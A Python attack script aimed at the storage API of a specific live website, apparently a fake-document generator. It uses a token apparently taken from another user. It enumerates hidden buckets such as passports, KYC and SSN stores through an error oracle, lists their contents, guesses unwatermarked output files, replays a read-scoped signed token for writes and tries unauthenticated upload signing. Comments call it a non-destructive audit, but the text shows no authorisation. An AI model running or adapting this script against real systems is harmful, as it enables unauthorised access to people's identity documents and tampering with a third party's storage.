#!/usr/bin/env python3
# Storage angle: hidden-bucket oracle, listings, 'generated' bucket filename probing,
# signed-URL scope replay test (non-destructive: only overwrites our own prior audit artefact),
# TUS signed-upload route auth check, storage version.
import json, sys, time, urllib.request, urllib.error, urllib.parse
sys.stdout.reconfigure(encoding="utf-8")
BASE = "https://cdn.onlyfakeai.ru"
PK = "<publishable-key>"
TA = json.load(open("their_token.txt"))["access_token"]
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
H = {"User-Agent": UA, "Accept": "application/json", "Origin": "https://onlyfakeai.ru",
     "Referer": "https://onlyfakeai.ru/", "apikey": PK}

def call(method, path, body=None, token=None, extra=None, read=2500, host=None):
    h = dict(H)
    if token: h["Authorization"] = "Bearer " + token
    if extra: h.update(extra)
    data = json.dumps(body).encode() if body is not None else None
    if data is not None: h["Content-Type"] = "application/json"
    url = (host or BASE) + path
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=20) as resp:
            return resp.status, resp.read(read).decode("utf-8", "replace"), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read(read).decode("utf-8", "replace"), dict(e.headers)
    except Exception as e:
        return "ERR", repr(e), {}

print("== 0. storage version ==")
print(call("GET", "/storage/v1/version")[:2])

print("\n== 1. hidden bucket oracle via public object route ==")
cands = """generated templates templates-public site-assets photos backgrounds portraits-public portraits id ids dl
passport passports residence residences product products media public avatars documents uploads files images
user-documents documents-generated exports backups private no-watermark no_watermark results output outputs renders
rendered previews thumbnails cache temp tmp admin system config secrets keys assets static blog template catalog
catalog-products originals sources source input inputs raw final signed del downloads download watermark watermarked
admin_exports payments invoices receipts kyc identity selfies landing promo banners product-images id-cards
driver-licenses residence-permits ssns ssn cards card documents-public user_uploads user_photos photo preview
job-files generated-files generated_documents generated-documents no-watermarks nowatermark documents-private
private-documents user-docs user-files job-outputs job_outputs result completed jobs-output
templates-private admin-docs admin_files reports exports-final archive archives store storage data db backup
no_watermark_docs no-watermark-docs documents_no_watermark originals-originals""".split()
existing = []
for b in sorted(set(cands)):
    st, body, _ = call("GET", f"/storage/v1/object/public/{urllib.parse.quote(b)}/__probe_nonexistent__", read=400)
    kind = "missing" if "NoSuchBucket" in body else ("EXISTS" if ("NoSuchKey" in body or st in (200, 206)) else f"?{st}")
    if kind == "EXISTS":
        existing.append(b); print(f"[BUCKET] {b} EXISTS (public-object route reaches it, status {st})")
    elif kind.startswith("?"):
        print(f"[?] {b} -> {st} {body[:120]}")
    time.sleep(0.22)
print("existing buckets:", existing)

print("\n== 2. listing probes on discovered buckets (anon + auth) ==")
for b in existing:
    for tok, lab in ((None, "anon"), (TA, "auth")):
        st, body, hd = call("POST", f"/storage/v1/object/list/{urllib.parse.quote(b)}",
                            body={"prefix": "", "limit": 30, "offset": 0}, token=tok, read=1500)
        print(f"[list {b} {lab}] {st} :: {body[:700]}")
        time.sleep(0.3)

print("\n== 3. 'generated' bucket filename probing (public read, metadata only via HEAD) ==")
try:
    photos = [l.strip().split("/")[-1] for l in open("photos_all.txt", encoding="utf-8", errors="replace") if l.strip()]
    ms = [p.split("_")[0] for p in photos if p.endswith("_preview.png")][:5]
except Exception as e:
    ms = []; print("photos_all err", e)
print("sample job ids:", ms)
suffixes = ["_preview.png", "_no_watermark.png", "_nowatermark.png", "_document.png", "_result.png", "_generated.png",
            "_final.png", "_output.png", "_doc.png", ".png", ".jpg", "_no_watermark.jpg", "_document.jpg", "_full.png",
            "_photo.png", "_id.png"]
found = 0
for m in ms:
    for suf in suffixes:
        st, body, hd = call("HEAD", f"/storage/v1/object/public/generated/{urllib.parse.quote(m + suf)}", read=10)
        if st in (200, 206):
            print(f"[HIT] generated/{m+suf} -> {st} content-length={hd.get('Content-Length')} type={hd.get('Content-Type')}")
            found += 1
        time.sleep(0.15)
print(f"generated-bucket hits: {found}/{len(ms)*len(suffixes)}")

print("\n== 4. signed-URL scope replay test (GHSA read-token->write; on our own prior audit artefact) ==")
ART = "vulnrat-audit-1794321400.txt"
st, body, hd = call("POST", f"/storage/v1/object/sign/backgrounds/{ART}", body={"expiresIn": 120})
print(f"[sign backgrounds/{ART}] {st} :: {body[:400]}")
token = None
try:
    token = json.loads(body)["signedURL"].split("token=")[1]
except Exception:
    pass
if token:
    print("got download-scoped token")
    st2, body2, hd2 = call("PUT", f"/storage/v1/object/upload/sign/backgrounds/{ART}?token={token}",
                           body=b"supa-angle scope replay probe", extra={"Content-Type": "text/plain"}, read=600)
    print(f"[replay download-token -> upload/sign] {st2} :: {body2[:300]}")
else:
    print("no token obtained (cannot test replay)")
print("\n== 5. TUS signed-upload route auth check (GHSA-8rrf-w776-x75g) ==")
for path in ["/storage/v1/upload/resumable", "/storage/v1/upload/resumable/sign", "/storage/v1/object/upload/sign/backgrounds/tus-probe.txt"]:
    st, body, hd = call("POST", path, body={}, read=400)
    print(f"[{path}] POST -> {st} allow={hd.get('Allow')} :: {body[:250]}")
    time.sleep(0.3)
st, body, hd = call("OPTIONS", "/storage/v1/upload/resumable", read=400)
print(f"[OPTIONS /upload/resumable] {st} allow={hd.get('Allow')} :: {body[:200]}")

print("\n== 6. unauthenticated signed-upload mint attempt for arbitrary photos path ==")
st, body, hd = call("POST", "/storage/v1/object/upload/sign/photos/supa-angle-write-probe.txt", body={}, read=500)
print(f"[anon upload/sign photos] {st} :: {body[:400]}")
st, body, hd = call("POST", "/storage/v1/object/upload/sign/backgrounds/supa-angle-write-probe.txt", body={}, read=500, token=TA)
print(f"[auth upload/sign backgrounds] {st} :: {body[:400]}")

print("\ndone")
